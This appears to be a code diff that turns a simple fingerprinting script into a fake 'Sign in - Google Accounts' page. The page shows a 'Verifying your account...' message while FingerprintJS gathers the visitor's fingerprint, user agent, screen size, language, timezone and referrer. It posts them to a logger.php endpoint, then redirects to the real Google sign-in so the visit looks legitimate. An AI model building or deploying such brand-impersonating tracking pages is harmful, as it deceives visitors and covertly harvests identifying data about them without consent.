@@ -1,36 +1,107 @@
-<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
-<script>
-  ;(async () => {
-    const fp = await FingerprintJS.load();
-    const result = await fp.get();
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in - Google Accounts</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #fff;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-container {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 40px;
+            max-width: 450px;
+            text-align: center;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+        .loading {
+            color: #1a73e8;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">Google</div>
+        <h1>Sign in</h1>
+        <div class="loading">Verifying your account...</div>
+        <div id="debug" style="display:none; margin-top:20px; font-size:12px; color:#666;"></div>
+    </div>
 
-    const payload = {
-      fingerprint: result.visitorId,
-      ip: '',
-      userAgent: navigator.userAgent,
-      screen: `${screen.width}x${screen.height}`,
-      lang: navigator.language,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      referrer: document.referrer,
-      timestamp: new Date().toISOString(),
-      redirected: true  // 🔥 track this redirect event
-    };
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <script>
+        function debug(message) {
+            console.log('Tracker Debug:', message);
+            const debugDiv = document.getElementById('debug');
+            debugDiv.style.display = 'block';
+            debugDiv.innerHTML += message + '<br>';
+        }
 
-    try {
-      await fetch('./logger.php', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(payload)
-      });
+        ;(async () => {
+            try {
+                debug('Loading FingerprintJS...');
+                const fp = await FingerprintJS.load();
+                debug('Getting fingerprint...');
+                const result = await fp.get();
+                debug('Fingerprint: ' + result.visitorId);
 
-      setTimeout(() => {
-        window.location.href = 'https://accounts.google.com/';
-      }, 3500);
+                const payload = {
+                    fingerprint: result.visitorId,
+                    ip: '',
+                    userAgent: navigator.userAgent,
+                    screen: `${screen.width}x${screen.height}`,
+                    lang: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    referrer: document.referrer,
+                    timestamp: new Date().toISOString(),
+                    redirected: true
+                };
 
-    } catch (e) {
-      setTimeout(() => {
-        window.location.href = 'https://accounts.google.com/';
-      }, 5000);
-    }
-  })();
-</script>
+                debug('Sending data to logger...');
+                const response = await fetch('./logger.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const responseText = await response.text();
+                debug('Logger response: ' + responseText);
+
+                if (response.ok) {
+                    debug('Success! Redirecting in 3 seconds...');
+                    setTimeout(() => {
+                        window.location.href = 'https://accounts.google.com/';
+                    }, 3000);
+                } else {
+                    debug('Error: ' + response.status);
+                    setTimeout(() => {
+                        window.location.href = 'https://accounts.google.com/';
+                    }, 5000);
+                }
+
+            } catch (e) {
+                debug('Exception: ' + e.message);
+                setTimeout(() => {
+                    window.location.href = 'https://accounts.google.com/';
+                }, 5000);
+            }
+        })();
+    </script>
+</body>
+</html>
